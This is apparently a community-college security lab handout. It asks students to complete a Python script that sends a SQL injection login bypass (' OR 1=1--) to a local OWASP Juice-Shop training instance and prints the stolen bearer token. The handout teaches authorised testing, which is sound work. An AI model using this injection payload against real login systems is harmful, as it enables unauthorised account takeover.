# Week 2 Lab 3: Apply What You Have Learned

#### [NICE Framework Reference](https://github.com/jadTalbert/NICE_Framework/)

- Role: [JRT-1](https://github.com/jadTalbert/NICE_Framework/blob/main/NICE_Framework/roles/roles.md)
- Tasks: [T-03,T-06,T-09,T-11,T-12,T-13,T-14,T-1020,T1079,T1118,T1119,T1229,T1279,T1341,T1619](https://github.com/jadTalbert/NICE_Framework/blob/main/NICE_Framework/tasks/tasks.md)
- Skills: [S-05,S-06,S-11,S-13,S-17,S0483,S0492,S0543,S0544,S0642,S0656,S0686,S0804](https://github.com/jadTalbert/NICE_Framework/blob/main/NICE_Framework/skills/skills.md)
- Knowledge: [K-03,K-05,K-11,K-12,K-13,K-15,K0675,K0677,K0680,K0682,K0683,K0684,K0686,K0688,K0730,K0751,K0832,K1079,K1182](https://github.com/jadTalbert/NICE_Framework/blob/main/NICE_Framework/knowledge/knowledge.md)

### Overview & Objectives:(Security & Python Scripting)
Apply your understanding of a White-Hat actor, RoE(Rules of Engagement) and reconnaissance(OSINT) using your already established Python skills from your CIS-115 course at Sandhills Community College.


<!--`install python3`-->

### Using DRY(Don't Repeat Yourself) Programming Methodology:
There is a concept in Software Engineering known as DRY. This acronym is important because it provides you a path for repeatable processes without having to go to the Juice-Shop web site each time you want to confrim or re-confirm a vulnerability. You could also build this concept into a repeatable pipeline of processes that are automated, so that your entire vulnerability assessment process does not require a human.


A colleague on your team---another White-Hat hacker tells you that she is not comfortable with programming in python, but heard that you were the SME(Subject Matter Expert) on the team. She tells you that she used ChatGPT to generate some code, but is not quite sure how to get it across the finish line to completion and asks that you take a look and see if you can get it work. She left commented instructions in the code for you in hopes that it would be helpful.

You should check to make sure docker is running on your local machine using the following command `docker ps`. After you confirm docker is running make sure the [Juice-Shop](http://localhost:8080) web site is also working. Then, launch VS Code on your local machine(not in docker!) and copy/paste the python code below and save the file. Use VS Code to address any problems in the code and then exeute the python program using the following command in VS Code: `python3 <your Python Program Name Goes Here>`.

```python
#imports the request library to send HTTP requests
import requests

# This code is a simple example of a SQL injection attack on a login endpoint. It sends a POST request to the login URL with a payload that attempts to bypass authentication by injecting SQL code into the email field.
url = "http://localhost:3000/rest/user/login"

# The payload is a dictionary containing the email and password fields. The email field contains a SQL injection string that will always evaluate to true, allowing the attacker to bypass authentication.
payload = {
    "email": "' OR 1=1--",
    "password": "random_password"
}

# The code sends a POST request to the login URL with the payload and stores the response in the 'response' variable. 
response = requests.post(url, json=payload)

# The code attempts to parse the response as JSON and store it in the 'data' variable. 
data = response.json()


# The code checks if the response status code is 200 and if the "authentication" field is present in the response data. If both conditions are met, it indicates that the SQL injection was successful and authentication was bypassed. Otherwise, it prints a message indicating that the exploit failed.
if response.status_code == 200 and "authentication" in data:
    #INSTRUCTIONS IN THE COMMENTS BELOW:
    #you should remove the pass key word and replace it with code that prints the email 
    #you should also print the bearer token that is returned in the response. The bearer token can be accessed from the "authentication" field in the response data.
    
    pass
else:
    print("[-] Exploit failed.")
```


After successfully implementing the python program above, you should take a close look at the code and see if this exploit looks familiar---you already did this in an earlier lab. So, what's different with the SQL Injection vs. the vulnerability you tested directly on the web site using `' OR 1=1--`?

### How To Submit This Lab:
- Upload your python program to Canvas
- Record a 2-3 minute video showing me that you understand how the python code works and what the exploit actually does. You should execute the program and show the results in your video! Feel free to compare it to the manual SQL Injection exploit if is helps, but you must show the program working.

